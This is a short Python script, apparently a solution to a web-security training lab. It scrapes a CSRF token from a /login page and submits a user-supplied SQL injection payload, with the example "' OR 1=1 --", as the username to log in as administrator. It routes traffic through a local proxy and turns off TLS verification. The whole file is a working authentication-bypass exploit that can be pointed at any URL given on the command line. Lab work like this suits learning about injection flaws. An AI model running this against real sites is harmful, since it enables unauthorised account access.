import requests
import urllib3
import sys
from bs4 import BeautifulSoup

proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable SSL verification warning

def get_csrf_token(session, url):
  uri = "/login"
  loginPageResponse = session.get(url + uri, proxies=proxies, verify=False)
  return BeautifulSoup(loginPageResponse.text, "html.parser").find("input")["value"]

def exploit_sqli(session, url, payload):
  csrfTokenParsed = get_csrf_token(session, url)
  data = { "csrf": csrfTokenParsed, "username": payload, "password": "any-password" }
  uri = "/login"

  labResponse = session.post(url + uri, data=data, proxies=proxies, verify=False)
  
  # Check if the SQL injection is successful
  if "Congratulations, you solved the lab!" in labResponse.text:
    return True
  else:
    return False

if __name__ == "__main__":
  try:
    url = sys.argv[1].strip()
    payload = sys.argv[2].strip()
  except IndexError:
    print("[+] Usage: %s <url> <payload>" % sys.argv[0])
    print("[+] Example: %s www.example.com \"' OR 1=1 --\"" % sys.argv[0])
    sys.exit(-1)

  session = requests.Session()

  if exploit_sqli(session, url, payload):
    print("[+] SQL Injection successful! We have logged in as administrator user")
  else:
    print("[-] SQL Injection unsuccessful!")
